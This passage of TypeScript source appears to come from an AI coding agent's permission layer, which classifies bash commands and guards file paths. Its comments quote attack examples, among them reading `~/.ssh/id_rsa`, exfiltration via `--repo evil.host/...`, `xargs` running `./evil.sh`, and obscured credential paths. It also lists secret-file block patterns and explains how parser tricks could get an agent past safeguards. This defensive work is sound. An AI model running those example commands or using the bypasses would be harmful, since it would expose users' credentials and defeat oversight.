  // Per-tool deny rules
  // -------------------------------------------------------------------------

  /**
   * Check deny rules for a specific tool and input combination.
   * Returns denied: true if any deny rule with a matching pattern fires.
   */
  checkDenyRules(toolName: string, input: string): DenyCheckResult {
    for (const rule of this.rules) {
      // paramPattern rules match structured named params, which this string-only
      // check cannot evaluate — skip them (they are enforced by check()).
      if (rule.paramPattern) continue;
      if (rule.action === 'deny' && this.toolNameMatches(rule.tool, toolName)) {
        if (!rule.pattern) {
          return { denied: true, reason: rule.reason || `Denied by rule for ${rule.tool}` };
        }
        const matched = toolName === 'bash'
          ? matchBashPattern(rule.pattern, input, 'deny')
          : matchPattern(rule.pattern, input);
        if (matched) {
          return { denied: true, reason: rule.reason || `Denied by rule for ${rule.tool}` };
        }
      }
    }
    return { denied: false };
  }

  // -------------------------------------------------------------------------
  // Bash command classification
  // -------------------------------------------------------------------------

  /**
   * Classify a bash command as safe, unsafe, or destructive.
   */
  /**
   * Single source of truth for the compound-command TOCTOU escalation reason:
   * returns a human-readable reason string when a bash command extracts an
   * archive before running git, or creates a filesystem link inside a compound —
   * both of which must require explicit approval even under an allow rule — or
   * `null` when neither shape is present. Used by {@link check} (to force `ask`)
   * and {@link deriveDecisionReason} (to explain WHY), so the predicate lives in
   * exactly one place.
   */
  private bashToctouEscalation(command: string): string | null {
    const archive = detectArchiveExtractionWithGit(command);
    if (archive.escalate) return archive.reason ?? 'archive-extraction TOCTOU';
    const symlink = detectSymlinkCreateCompound(command);
    if (symlink.escalate) return symlink.reason ?? 'symlink-creation TOCTOU';
    const cdDesync = detectCdSensitiveDesync(command);
    if (cdDesync.escalate) return cdDesync.reason ?? 'cwd-desync TOCTOU';
    return null;
  }

  classifyBashCommand(command: string): BashClassification {
    const result = this.classifyBashCommandCore(command);
    // Any command that touches a credential/secret path — even a read like
    // `cat ~/.ssh/id_rsa` — must never be auto-'safe'; elevate to a prompt.
    // Never downgrade a stronger verdict (destructive/unsafe) here.
    if (result === 'safe' && commandTargetsCredentialPath(command.trim())) return 'unsafe';
    // Unsafe-compound forced-ask: a subshell `( … )` or brace command group
    // `{ …; }` groups statements whose runtime execution context (a child shell
    // / an inline group) the flat classifier cannot soundly reason about — a
    // benign-looking inner command can still carry a redirection, cd-desync, or
    // side effect at the group boundary that per-command classification misses.
    // the reference forces behavior:'ask' with NO rule suggestions in exactly this
    // case (bashToolCheckCommandOperatorPermissions via
    // getTreeSitterAnalysis().compoundStructure.hasSubshell || hasCommandGroup),
    // because such a grouping can never be safely auto-allowed. AMI mirrors that
    // by never letting a grouped command stay auto-'safe' — it is elevated to a
    // prompt. A stronger verdict (unsafe/destructive) is never downgraded.
    if (result === 'safe') {
      const compound = analyzeCommandStructure(command).compoundStructure;
      if (compound.hasSubshell || compound.hasCommandGroup) return 'unsafe';
    }
    return result;
  }

  private classifyBashCommandCore(command: string): BashClassification {
    // Strip shell comment lines — they are no-ops in bash
    const stripped = command.split('\n').filter(l => !l.trim().startsWith('#')).join('\n');
    const trimmed = stripped.trim();
    if (!trimmed) return 'safe';

    // Fail-closed on an UNPARSEABLE command: if a quote is left open a real shell's
    // tokenizer would error, so the naive whitespace/regex splitting below would see
    // a different token stream than the shell actually runs — a parser differential
    // that could hide a dangerous command (e.g. `echo "ls` auto-allowed as a bare
    // `echo`). Classify it `'unsafe'` so it prompts rather than being proven safe.
    // Heredoc bodies are stripped first so a legitimate `'`/`"` inside a heredoc body
    // (not shell syntax) never trips the balance check. Mirrors the reference's
    // tryParseShellCommand → require-permission-on-parse-failure gate.
    if (hasUnbalancedQuotes(stripHeredocBodies(trimmed))) return 'unsafe';

    // Unwrap shell control structures so classification sees the body
    // commands, not the loop/if keywords. The original trimmed is kept
    // for regex checks that need the full command syntax (like rm -rf).
    const unwrapped = unwrapShellControlStructures(trimmed);

    // Fail-closed on pathologically wide compound commands: above the cap we stop
    // analyzing (each segment would run the full validator set) and treat the
    // command as unsafe so it prompts rather than being proven safe (CC-643).
    if (splitCompoundCommand(trimmed).length > MAX_SUBCOMMANDS_FOR_SECURITY_CHECK) {
      return 'unsafe';
    }

    const bases = extractBaseCommands(trimmed);

    // Check destructive first (highest severity wins)
    for (const cmd of bases) {
      // `git clean` is flag-dependent: a `-n`/`--dry-run` preview only LISTS what
      // would be removed (read-only) and must NOT be escalated; only an actual
      // clean (`-f`/`--force`) deletes untracked files. Shares GIT_CLEAN_FORCE_RE
      // with the warning engine so both paths agree (parity: the reference excludes the
      // dry-run from the destructive boundary).
      if (cmd === 'git clean') {
        if (GIT_CLEAN_FORCE_RE.test(trimmed)) return 'destructive';
        continue;
      }
      if (DESTRUCTIVE_COMMANDS.has(cmd)) return 'destructive';
    }

    // Check destructive SQL patterns on the entire command string
    for (const pattern of DESTRUCTIVE_SQL_PATTERNS) {
      if (pattern.test(trimmed)) return 'destructive';
    }

    // Check if "rm" with -rf or -r flags
    if (/\brm\s+.*-[^\s]*r/i.test(trimmed) || /\brm\s+.*-[^\s]*f/i.test(trimmed)) {
      return 'destructive';
    }

    // PowerShell destructive cmdlets (AMI runs PowerShell on Windows). Power-control
    // / disk-format variants are blocked unconditionally by HARDLINE above; these
    // are the recursive/forced deletions that need an explicit-approval prompt.
    if (/\bRemove-Item\b[^\n]*-(Recurse|Force)\b/i.test(trimmed)) return 'destructive';
    if (/\bClear-Content\b/i.test(trimmed)) return 'destructive';

    // Destructive git operations — discard local changes irreversibly
    if (/\bgit\s+(checkout|restore)\s+.*--\s*\./.test(trimmed)) return 'destructive';
    if (/\bgit\s+restore\s+\./.test(trimmed)) return 'destructive';
    if (/\bgit\s+stash\s+drop\b/.test(trimmed)) return 'destructive';
    if (/\bgit\s+stash\s+clear\b/.test(trimmed)) return 'destructive';
    if (/\bgit\s+reset\s+--merge\b/.test(trimmed)) return 'destructive';
    if (/\bgit\s+reset\s+--keep\b/.test(trimmed)) return 'destructive';
    // A force push can overwrite remote history on ANY branch (not only protected
    // ones), so it is a distinct destructive boundary above a normal `git push`
    // (the reference escalates --force/--force-with-lease/-f). A bare `git push` stays
    // merely 'unsafe' below via UNSAFE_COMMANDS.
    if (/\bgit\s+push\b[^\n]*?(?:--force\b|--force-with-lease\b|\s-[A-Za-z]*f\b)/.test(trimmed)) return 'destructive';
    // `git branch -D` / `--delete --force` force-deletes a branch even when it is
    // unmerged — irreversible local work loss. A plain `-d` refuses to drop an
    // unmerged branch and stays 'unsafe' (via the git read-only guard).
    if (/\bgit\s+branch\b[^\n]*(?:\s-[A-Za-z]*D\b|--delete\b[^\n]*--force\b|--force\b[^\n]*--delete\b)/.test(trimmed)) return 'destructive';
    // `kubectl delete` removes live cluster resources irreversibly. The `delete`
    // verb may follow global flags (`kubectl -n ns delete …`); a single bounded
    // character-class scan (no nested quantifier) stays within one segment and
    // requires `delete` to be its own whitespace-led token so a flag VALUE like
    // `-l app=delete` does not false-trigger.
    if (/\bkubectl\b[^;|&\n]*\sdelete\b/.test(trimmed)) return 'destructive';

    // Unsafe help/man/git-help/info forms execute arbitrary code: `man -P <cmd>`
    // (pager exec), `man -l`/`--html`/`--pager=`, `git help --web` (browser), and
    // `info --subnodes | …`. These must never be auto-approved even when man/help
    // sit in SAFE_COMMANDS or an allow rule — man and help are classified by their
    // literal command name, and `help` is often aliased to `man`. Wires the
    // bash-security detector into the classifier (the reference's man/help safeFlags).
    if (detectUnsafeHelpCommand(trimmed)) return 'unsafe';

    // A `cd`/`Set-Location` followed by a file-writing redirection resolves the
    // target against the NEW cwd at runtime — a path-desync the validator can't see.
    // Require manual approval (the reference's cd+write guard).
    if (commandHasCdWriteDesync(trimmed)) return 'unsafe';

    // More than one directory change in a single command defeats cwd-relative path
    // validation (the validator can't track which cwd each later statement runs in).
    // Require approval (the reference's multi-cd guard).
    if (countDirectoryChanges(trimmed) > 1) return 'unsafe';

    // xargs anywhere in the command (even behind a pipe like `ls | xargs …`) must
    // target a read-only command. Validate it up-front so a safe leading command
    // can't short-circuit the classifier to 'safe' before the xargs target is
    // checked (parser-differential RCE: `ls | xargs -I echo ./evil.sh`).
    if (bases.includes('xargs') && !isXargsSafe(unwrapped)) return 'unsafe';

    // Flag-aware checks for commands that are safe/destructive depending on flags
    if (/\bsed\s+.*-[^\s]*i/.test(trimmed)) return 'unsafe'; // sed -i modifies files in place
    if (/\bfind\s+.*-delete\b/.test(trimmed)) return 'destructive';
    if (/\bfind\s+.*-(?:exec|ok)(dir)?\s+rm\b/.test(trimmed)) return 'destructive';
    if (/\bxargs\s+.*\brm\b/.test(trimmed)) return 'destructive';
    if (/\bxargs\s+.*\bmv\b/.test(trimmed)) return 'unsafe';
    if (/\bmake\s+(clean|install|distclean|uninstall)\b/.test(trimmed)) return 'unsafe';

    // Script one-liner safety: python3 -c, node -e, ruby -e, perl -e
    // Must come before UNSAFE_COMMANDS so safe one-liners aren't blocked
    const scriptMatch = trimmed.match(/^(python3?|node|ruby|perl)\s+(-[ce])\s+['"]?(.*?)['"]?\s*$/);
    if (scriptMatch) {
      const [, lang, , code] = scriptMatch;
      if (isScriptOneLinerSafe(lang!, code!)) return 'safe';
      return 'unsafe';
    }

    // Check unsafe
    for (const cmd of bases) {
      if (UNSAFE_COMMANDS.has(cmd)) return 'unsafe';
    }

    // Docker: only read-only subcommands are safe. Reject ANY `$`-substitution
    // first — the validator sees the literal `$VAR`/`$(cmd)` text but the shell
    // expands it at runtime, a parser differential that can smuggle a non-read
    // subcommand or secret past this check (the reference's isDockerSafe `$` rejection).
    if (/\bdocker\s+/.test(trimmed)) {
      if (containsShellSubstitution(unwrapped)) return 'unsafe';
      // Skip leading global flags (and the values they consume, e.g. `-H <host>`,
      // `--context <ctx>`) to reach the REAL subcommand, so `docker -D ps` reads
      // `ps` instead of `-D`. Mirrors the reference's spec-driven flag-value skipping.
      const dockerTokens = trimmed.split(/\s+/).filter(Boolean);
      const dIdx = dockerTokens.indexOf('docker');
      const subIdx = dIdx >= 0 ? skipGlobalFlags(dockerTokens, dIdx + 1, BASH_COMMAND_SPECS['docker']) : -1;
      const dockerSub = subIdx >= 0 && subIdx < dockerTokens.length ? dockerTokens[subIdx] : undefined;
      if (dockerSub && DOCKER_SAFE_SUBCOMMANDS.has(dockerSub)) {
        // A safe subcommand is only auto-allowed when its FLAGS are also known-safe
        // (`docker logs`/`docker inspect` carry typed flags; an unrecognized flag
        // must prompt rather than be silently granted).
        if (!dockerReadOnlyFlagsSafe(dockerSub, dockerTokens.slice(subIdx + 1))) return 'unsafe';
        return 'safe';
      }
      return 'unsafe';
    }

    // Check safe prefixes (e.g., "git status", "npm test")
    for (const cmd of bases) {
      if (SAFE_PREFIXES.has(cmd)) {
        // A git read-only prefix can still smuggle a write (ref creation via
        // `git branch/tag <name>`, remote mutation, `--output` file write) or a
        // sandbox escape (`cd /attacker && git ...` runs planted .git/hooks).
        // Validate the full command before auto-allowing.
        if (cmd.startsWith('git ') && !isGitReadOnlyCommandSafe(unwrapped)) return 'unsafe';
        // A `gh` read-only prefix can still exfiltrate via a foreign HOST/OWNER/REPO
        // spec (`gh pr list --repo evil.host/owner/repo`) or smuggle a write in a
        // compound. Revalidate the full command before auto-allowing (gh analogue of
        // the git guard above). Mirrors the reference's ghIsDangerousCallback.
        if (cmd.startsWith('gh ') && !isGhReadOnlyCommandSafe(unwrapped)) return 'unsafe';
        // Reject `$`-substitution in ANY auto-allowed compound/external read
        // command (git, gh, npm, go, cargo, make, …) — the validator sees the
        // literal `$VAR`/`$(cmd)` text but the shell expands it at runtime, a
        // parser differential that can smuggle a non-read subcommand or leak a
        // secret via an error message past this check. Mirrors the reference's blanket
        // `$`-rejection on auto-allowed external commands (isGitSafe/isDockerSafe
        // and the PowerShell readOnlyValidation variable-expansion guard).
        if (containsShellSubstitution(unwrapped)) return 'unsafe';
        if (allSegmentsKnown(unwrapped)) return 'safe';
        break;
      }
    }

    // Check single-word safe commands with flag validation
    for (const cmd of bases) {
      if (SAFE_COMMANDS.has(cmd)) {
        const tokens = unwrapped.split(/\s+/);
        const cmdIdx = tokens.indexOf(cmd);
        const args = cmdIdx >= 0 ? tokens.slice(cmdIdx + 1) : [];

        if (!validateCommandFlags(cmd, args)) return 'unsafe';

        // `date`: a bare positional like `010203042024` SETS the system clock.
        // Only a format string (leading '+') is read-only — any other positional
        // (or -s/--set/-f) must prompt. Mirrors the reference's date dangerous-callback.
        if (cmd === 'date') {
          for (const a of args) {
            if (a.startsWith('-')) {
              if (/^(-s|--set|-f)$/.test(a)) return 'unsafe';
              continue;
            }
            const bare = a.replace(/^["']/, ''); // tolerate a quoted "+..." format
            if (!bare.startsWith('+')) return 'unsafe'; // clock-setting positional
          }
        }

        // jq/yq: additional dangerous-construct check
        if ((cmd === 'jq' || cmd === 'yq') && isJqDangerous(args)) return 'unsafe';

        // `hostname`: a bare positional SETS the system hostname (`hostname newname`).
        // Only flag-driven reads (`hostname -f`, `-i`, …) are safe. Mirrors the reference's
        // hostname positional-argument guard.
        if (cmd === 'hostname') {
          for (const a of args) {
            if (!a.startsWith('-')) return 'unsafe'; // a positional sets the hostname
          }
        }

        // `tput`: capability names are positionals. Only read-only capabilities are
        // safe; the dangerous ones (reset/init/clear/mc5/pfloc/… and the `-S` stdin
        // batch flag) alter terminal state or run arbitrary sequences. Strict: any
        // capability not on the allowlist prompts. Mirrors the reference's tput guard.
        if (cmd === 'tput') {
          const allowedCaps = SAFE_COMMAND_FLAGS['tput']!.allowed;
          for (const a of args) {
            if (a === '-S') return 'unsafe'; // batch-from-stdin: unbounded capabilities
            if (a.startsWith('-')) continue; // `-T<term>` etc. handled by flag validation
            if (!allowedCaps.has(a)) return 'unsafe'; // unlisted capability
          }
        }

        // `lsof`: `+` options write/augment state — notably `+m`/`+m<path>` emits a
        // mount-supplement file. Only `-` read flags are safe. Mirrors the reference's lsof
        // `+`-option rejection.
        if (cmd === 'lsof') {
          for (const a of args) {
            if (a.startsWith('+')) return 'unsafe';
          }
        }

        // xargs: must target a safe command
        if (cmd === 'xargs' && !isXargsSafe(unwrapped)) return 'unsafe';

        // `dotnet`: only its read-only top-level SDK queries (--version/--info/
        // --list-runtimes/--list-sdks) are auto-safe. A bare `dotnet` (help) or any
        // subcommand (build/run/test/…) must prompt. Mirrors the reference's isDotnetSafe.
        if (cmd === 'dotnet' && !isDotnetSafe(args)) return 'unsafe';

        // Block shell substitutions ($VAR, $(cmd)) but allow glob patterns
        if (containsShellSubstitution(unwrapped)) return 'unsafe';

        if (allSegmentsKnown(unwrapped)) return 'safe';
        break;
      }
    }

    // sed without an in-place write flag is read-only (prints to stdout). Uses a
    // per-segment, quote-aware tokenized check so a `-...i` flag belonging to a
    // different command in a compound, or a quoted `-i` inside the sed script, no
    // longer forces a misclassification (parity: the reference's tokenized isReadOnlySed).
    if (isReadOnlySedCommand(trimmed)) return 'safe';
    // find is read-only only without any command-running primary
    // (-delete, -exec, -execdir, -ok, -okdir).
    if (/\bfind\b/.test(trimmed) && !/(^|\s)-delete\b/.test(trimmed) && !/(^|\s)-exec(dir)?\b/.test(trimmed) && !/(^|\s)-ok(dir)?\b/.test(trimmed)) return 'safe';

    // Check if extracted paths target system directories
    const cmdPaths = extractCommandPaths(trimmed);
    for (const p of cmdPaths) {
      for (const sysDir of SYSTEM_DIRECTORIES) {
        const resolved = path.resolve(p);
        if (resolved === sysDir || resolved.startsWith(sysDir + path.sep)) {
          return 'destructive';
        }
      }
    }

    // PowerShell read-only cmdlets (Get-ChildItem, Get-Content, Select-String, …)
    // are the Windows equivalents of the POSIX SAFE_COMMANDS reads above. A
    // command composed solely of allowlisted read-only cmdlets with no dangerous
    // construct is auto-allowed, mirroring the reference's CMDLET_ALLOWLIST /
    // isReadOnlyCommand. Placed last so every destructive/unsafe guard above
    // (incl. the system-directory and credential-path nets) wins first.
    if (isReadOnlyPowerShellCommand(trimmed)) return 'safe';

    // Unknown commands default to unsafe
    return 'unsafe';
  }

  // -------------------------------------------------------------------------
  // Path safety
  // -------------------------------------------------------------------------

  /**
   * Check whether a file path is safe to operate on.
   *
   * Allowed:
   *   - Paths within the working directory
   *   - Paths within the user's home directory
   *
   * Denied:
   *   - System directories (/etc, /usr, /bin, /var, /sys, /proc, etc.)
   *   - Paths containing ".." segments that escape cwd
   */
  /**
   * Resolve a path for permission checks: expand ~, make absolute against cwd, and
   * resolve symlinks (so an in-cwd symlink pointing at /etc or a sibling dir cannot
   * smuggle access past the prefix check). A not-yet-existing path (a write target)
   * keeps its normalized form.
   */
  private resolveForCheck(filePath: string, cwd: string): string {
    const expanded = expandPath(filePath, cwd);
    // Special-file guard BEFORE realpath: lstat the target and bail for FIFOs,
    // sockets, and char/block devices. fs.realpathSync can block indefinitely on a
    // FIFO waiting for a writer (an unbounded hang with no timeout), so a special
    // file is never realpath-resolved — its expanded (NFC) form is returned as-is.
    // A non-existent path (ENOENT) or unreadable parent falls through to realpathNFC,
    // which tolerates it (write targets keep their expanded form). Mirrors the reference's
    // safeResolvePath special-file screen (utils/fsOperations.ts L148-161).
    try {
      const st = fs.lstatSync(expanded);
      if (st.isFIFO() || st.isSocket() || st.isCharacterDevice() || st.isBlockDevice()) {
        return expanded.normalize('NFC');
      }
    } catch {
      // not-yet-existing / unreadable — realpathNFC handles it below
    }
    // Canonicalize to the real location and re-apply NFC normalization: on an
    // NFD-storing filesystem fs.realpathSync returns the decomposed on-disk
    // spelling, which would not byte-match an NFC cwd/rule. A not-yet-existing
    // write target keeps its already-NFC expanded form. Shared helper so the
    // single realpath+NFC rule is not re-implemented per call site.
    return realpathNFC(expanded);
  }

  /**
   * FORBIDDEN paths are never readable by the agent — even inside the workspace, even in
   * a granted root, even with explicit user consent: credential/secret files and system
   * directories. Mirrors the credential write-guard so reads are no narrower than writes
   * (.aws/credentials, .git-credentials, .kube/config, .ssh keys, .env, .pem/.key, /etc…).
   */
  private isForbiddenReadPath(resolved: string): boolean {
    if (isCredentialPath(resolved)) return true;
    const basename = path.basename(resolved).toLowerCase();
    const sensitiveNames = ['.env', 'id_rsa', 'id_ed25519', 'id_ecdsa', 'id_dsa'];
    const sensitiveExts = ['.pem', '.key', '.p12', '.pfx', '.keystore'];
    const sensitivePatterns = [/^\.env$/, /^\.env\.local$/, /^\.env\.production$/,
      /^credentials\.json$/, /^secrets\.ya?ml$/, /^\.netrc$/];
    if (sensitiveNames.some(s => basename === s) ||
        sensitiveExts.some(e => basename.endsWith(e)) ||
        sensitivePatterns.some(p => p.test(basename))) {
      return true;
    }
    // Case-fold the directory-prefix comparison on case-insensitive filesystems so
    // a `/USR/bin` or `/Etc/passwd` reference cannot evade the system-dir guard
    // (gap U003). On Linux this is a no-op.
    const fResolved = normalizeCaseForComparison(resolved);
    for (const sysDir of SYSTEM_DIRECTORIES) {
      const fSysDir = normalizeCaseForComparison(sysDir);
      if (fResolved === fSysDir || fResolved.startsWith(fSysDir + path.sep)) return true;
    }
    return false;
  }

  /**
   * FORBIDDEN at ANY symlink hop: expand `filePath`, walk the FULL symlink chain
   * ({@link getPathsForPermissionCheck}) and return true if the original path, ANY
   * intermediate target, OR the final resolved path is a forbidden read path. This
   * closes the symlink-chain escape where only the final realpath is inspected —
   * e.g. `top → dir/id_rsa → dir/plain.txt`: the final `plain.txt` is innocuous but
   * the intermediate `id_rsa` hop is a credential path the deny must still catch.
   * Mirrors the reference's getPathsForPermissionCheck "match at any hop" semantics.
   */
  private isForbiddenAtAnyHop(filePath: string, cwd: string, precomputedHops?: readonly string[]): boolean {
    const expanded = expandPath(filePath, cwd);
    for (const hop of getPathsForPermissionCheck(expanded, 40, precomputedHops)) {
      if (this.isForbiddenReadPath(hop)) return true;
    }
    return false;
  }

  /**
   * The canonical hop list for an input path when it needs NO symlink resolution —
   * i.e. the NFC realpath (`resolved`) is byte-equal to the plain NFC-expanded form.
   * In that case the symlink-hop walk is trivially `[resolved]`, so returning it
   * lets {@link isForbiddenAtAnyHop} skip the lstat/readlink chain (parity: the reference's
   * precomputedPathsToCheck canonical fast-path). Returns `undefined` when the path
   * DID resolve through a symlink / `..` collapse, so the caller falls back to the
   * full hop walk that still inspects every intermediate target.
   */
  private canonicalHopFastPath(filePath: string, cwd: string, resolved: string): readonly string[] | undefined {
    return resolved === expandPath(filePath, cwd).normalize('NFC') ? [resolved] : undefined;
  }

  /**
   * WORKSPACE containment: a resolved path is inside the workspace iff it is under the
   * launch cwd OR under a user-granted read root (registerAllowedRoot). This is the
   * boundary that confines the agent to where it was started — sibling, parent, and
   * other-$HOME paths are NOT inside unless the user explicitly granted them.
   */
  private isWithinWorkspace(resolved: string, cwd: string): boolean {
    // Strip trailing separators so a cwd/root passed as "/ws/" doesn't become "/ws//"
    // (path.normalize preserves a trailing slash), which would break the prefix match.
    // Case-fold on case-insensitive filesystems (gap U003): on macOS/Windows a
    // differently-cased-but-identical path (cwd `/Users/foo/Project`, resolved
    // `/users/foo/project/file`) names the same file and must count as contained;
    // a raw case-sensitive prefix test would wrongly treat it as outside. On Linux
    // this is a no-op (distinct casings = distinct files).
    // NFC-normalize before case-folding so an NFD-spelled cwd/root compares equal
    // to the NFC-canonicalized `resolved` candidate (resolveForCheck -> realpathNFC);
    // keeps the containment boundary Unicode-canonical on both sides.
    // macOS /private symlink-equivalence: /private/var→/var, /private/tmp→/tmp.
    // Lexical (not realpath) so it also folds a NON-EXISTENT write target, whose
    // real path cannot be resolved. Applied to both sides before case/NFC folding.
    // Mirrors the reference's pathInWorkingPath private-prefix normalization. On Linux the
    // prefixes never occur, so this is a no-op.
    const foldPrivate = (p: string) =>
      p.replace(/^\/private\/var\//, '/var/').replace(/^\/private\/tmp(\/|$)/, '/tmp$1');
    const strip = (p: string) =>
      normalizeCaseForComparison(foldPrivate(p.replace(/[/\\]+$/, '') || p).normalize('NFC'));
    const r = strip(resolved);
    const contains = (base: string): boolean => r === base || r.startsWith(base + path.sep);
    // A workspace base (cwd or a granted root) matches both in its NORMALIZED form
    // and its REALPATH-resolved form, so a launch cwd / root that is itself a
    // symlink (e.g. process.env.PWD symlinked to the real cwd) still contains the
    // realpath-canonicalized candidate `resolved`. realpath is wrapped in try/catch
    // for a not-yet-existing base. Mirrors the reference's symlinked-PWD working-dir
    // registration (permissionSetup.ts isSymlinkTo). This only ADDS matches — it
    // never widens past the real directory tree, so it cannot cause a false allow.
    for (const base of [path.normalize(cwd), ...this.allowedReadRoots.keys()]) {
      if (contains(strip(base))) return true;
      // Session-stable: a base's canonical realpath is memoized so repeated checks
      // don't re-pay the lstat/readlink walk per base (parity: the reference's
      // memoize(getPathsForPermissionCheck) for session-stable config paths). A
      // non-existent base resolves to null and is not cached, so the normalized
      // form above stays the only candidate for it.
      const real = resolveSessionStableBaseRealpath(base);
      if (real !== null && real !== base && contains(strip(real))) return true;
    }
    return false;
  }

  /**
   * Hard boundary for the tools' path guard: true only when a path is BOTH non-forbidden
   * AND inside the workspace (launch cwd or a user-granted root). Confines the agent to
   * its launch directory — reading elsewhere in $HOME (e.g. ~/dev/other-project), a
   * sibling, or a parent is denied unless the user granted it via /add-dir or an approved
   * out-of-workspace prompt. NOTE: callers that support user consent should prefer
   * classifyReadAccess() so a user-pointed out-of-workspace file can be approved.
   */
  isPathAllowed(filePath: string, cwd: string): boolean {
    const resolved = this.resolveForCheck(filePath, cwd);
    if (this.isForbiddenReadPath(resolved)) return false;
    // Also inspect every symlink hop, not just the final realpath, so a forbidden
    // intermediate target in a symlink chain cannot be laundered behind an
    // innocuous final file. When the path needed no symlink resolution the hop
    // walk is trivially [resolved] — pass it so the lstat chain is skipped.
    if (this.isForbiddenAtAnyHop(filePath, cwd, this.canonicalHopFastPath(filePath, cwd, resolved))) return false;
    // Scratchpad carve-out: a path inside the operator-configured scratchpad dir is
    // inside the agent's allowed read surface even when it sits outside the launch
    // workspace (parity: the reference's getScratchpadDir allowlist). Placed AFTER the
    // forbidden guards so a credential/system path can never be laundered through it.
    if (isScratchpadPath(resolved)) return true;
    // A shell-expansion / tilde-variant TOCTOU path is never silently auto-allowed
    // (it is kept literal here but rewritten by the shell at run time) — keep this
    // boundary consistent with classifyReadAccess, which gates it to a prompt.
    if (detectPathExpansionHazard(filePath)) return false;
    // A plain (non-traversal) read glob cannot be statically validated — a symlink
    // matched inside its expansion is never examined — so it is never silently
    // auto-allowed; the consent-aware classifyReadAccess gates it to a prompt.
    if (isUnvalidatableReadGlob(filePath)) return false;
    return this.isWithinWorkspace(resolved, cwd);
  }

  /**
   * Three-way read classification that drives the consent flow:
   *   'deny'   — forbidden (credential/system): never read, even with consent.
   *   'allow'  — inside the workspace (cwd or a granted root): read without prompting.
   *   'prompt' — outside the workspace but NOT forbidden: the user must consent. This is
   *              what lets a file the user explicitly points at (e.g. an image under
   *              /some/other/path) work, while a silent `cat ../../other/secret` is gated.
   *              On approval the caller should registerAllowedRoot(dirname(path)).
   */
  classifyReadAccess(filePath: string, cwd: string): 'allow' | 'deny' | 'prompt' {
    const resolved = this.resolveForCheck(filePath, cwd);
    if (this.isForbiddenReadPath(resolved)) return 'deny';
    // A forbidden target at ANY symlink hop (not only the final realpath) is a
    // hard deny — a chain cannot launder a credential/system path behind an
    // innocuous final file. A path that needed no symlink resolution skips the walk.
    if (this.isForbiddenAtAnyHop(filePath, cwd, this.canonicalHopFastPath(filePath, cwd, resolved))) return 'deny';
    // Scratchpad carve-out: a read inside the operator-configured scratchpad dir is
    // auto-allowed even outside the launch workspace (parity: the reference's getScratchpadDir
    // allowlist). AFTER the forbidden guards so a credential/system path still denies.
    if (isScratchpadPath(resolved)) return 'allow';
    // TOCTOU: a path carrying shell-expansion syntax ($/%/leading '=') or an
    // unsupported tilde variant (~user/~+/~-) is validated as a literal here but
    // rewritten by the shell at execution, so it can never be silently auto-allowed
    // even when it resolves inside the workspace — force a manual-approval prompt.
    // Mirrors the reference's pathValidation blanket-reject (pathValidation.ts L393-L436).
    if (detectPathExpansionHazard(filePath)) {
      // Deny-only guess BEFORE prompting (parity: the reference's checkDenyRuleForGuessedPath,
      // PowerShellTool/pathValidation.ts L984-L1008): strip the obscuring construct to a
      // best-effort literal and, if THAT resolves to a forbidden credential/system path,
      // DENY outright instead of merely prompting. Without this an obscured forbidden
      // path (`${HOME}/.ssh/id_rsa`, `` /x/`whoami`/../../.aws/credentials ``) downgrades
      // a hard deny to an "ask" — which an auto-allow session then silently grants (the
      // checkPathPermission auto-grant branch). A tilde-variant is excluded (the guess
      // for `~user` cannot be resolved to a concrete forbidden target) so it still
      // prompts. The guess is used ONLY to deny, never to allow.
      const guess = stripPathObscuring(filePath);
      if (guess && guess !== filePath) {
        const guessResolved = this.resolveForCheck(guess, cwd);
        if (this.isForbiddenReadPath(guessResolved) || this.isForbiddenAtAnyHop(guess, cwd)) {
          return 'deny';
        }
      }
      return 'prompt';
    }
    // Glob read paths cannot be statically validated (finding #15): the pre-glob
    // base is the only realpath'd segment, so a symlink matched inside the
    // expansion (e.g. `/project/[star]/passwd`, `/project/link → /etc`) is never
    // examined while the literal glob still prefix-matches the workspace. Force a
    // manual-approval prompt for a plain read glob; a traversal glob falls through
    // so its `..`-collapsed concrete target is validated against the workspace and
    // forbidden guards above. Parity: the reference's pathValidation.ts L1199-L1241.
    if (isUnvalidatableReadGlob(filePath)) return 'prompt';
    if (this.isWithinWorkspace(resolved, cwd)) return 'allow';
    // Edit-access-implies-read: an out-of-workspace path the user granted EDIT access
    // to (a `file_edit` allow rule) is readable without a separate read prompt — but
    // read-specific deny/ask rules already won inside {@link editAccessImpliesRead}.
    if (this.editAccessImpliesRead(filePath)) return 'allow';
    return 'prompt';
  }

  /**
   * The user-facing reason a path must be manually approved because it carries a
   * shell-expansion / tilde-variant TOCTOU hazard or is an unvalidatable read glob,
   * or `null` when the path is inert. Lets the permission UI explain WHY an
   * otherwise-valid-looking path was gated rather than mislabelling it "outside the
   * workspace".
   */
  pathExpansionHazardReason(filePath: string): string | null {
    const hazard = detectPathExpansionHazard(filePath);
    if (hazard) return pathExpansionHazardReason(hazard);
    if (isUnvalidatableReadGlob(filePath)) {
      return 'Glob patterns in read paths require manual approval — a symlink '
        + 'matched inside the glob expansion cannot be statically validated';
    }
    return null;
  }

  // -------------------------------------------------------------------------
  // Denial tracking & circuit breaker
  // -------------------------------------------------------------------------

  /**
   * Record a denied tool invocation so that repeat requests are auto-denied
   * without re-prompting the user.
   */
  trackDenial(toolName: string, input: Record<string, unknown>): void {
    const key = denialKey(toolName, input);
    this.deniedCommands.add(key);
  }

  /**
   * Check whether a given invocation has already been denied.
   */
  isDenied(toolName: string, input: Record<string, unknown>): boolean {
    const key = denialKey(toolName, input);
    return this.deniedCommands.has(key);
  }

  /**
   * Clear all tracked denials.
   */
  clearDenials(): void {
    this.deniedCommands.clear();
  }

  /**
   * Record a denial. Always advances the circuit-breaker counters; when a
   * `display` string is supplied it is ALSO appended (newest-first, bounded) to
   * the recency-ordered denial log so the user can later review exactly what was
   * blocked (mirrors the reference's getAutoModeDenials / AutoModeDenial store). This is
   * the single canonical denial recorder — do not add a parallel one. `source`
   * distinguishes a model/classifier block from a rule/hardline/mode deny.
   */
  recordDenial(
    display?: string,
    source: RecentDenial['source'] = 'rule',
    reason?: string,
    classifier?: RecentDenial['classifier'],
  ): void {
    this.consecutiveDenials++;
    this.totalDenials++;
    if (display !== undefined) {
      // A 'mode' denial's display is a prose description, not a command; everything
      // else is command-like, so classify it as a bash call for a best-effort risk
      // tier. Pure + deterministic (reuses the canonical bash classifier).
      const riskLevel =
        source === 'mode'
          ? undefined
          : classifyPermissionRisk('bash', { command: display }).riskLevel;
      this._recentDenials.unshift({
        display, source, reason, riskLevel, timestamp: Date.now(),
        ...(classifier !== undefined ? { classifier } : {}),
      });
      if (this._recentDenials.length > this.MAX_RECENT_DENIALS) {
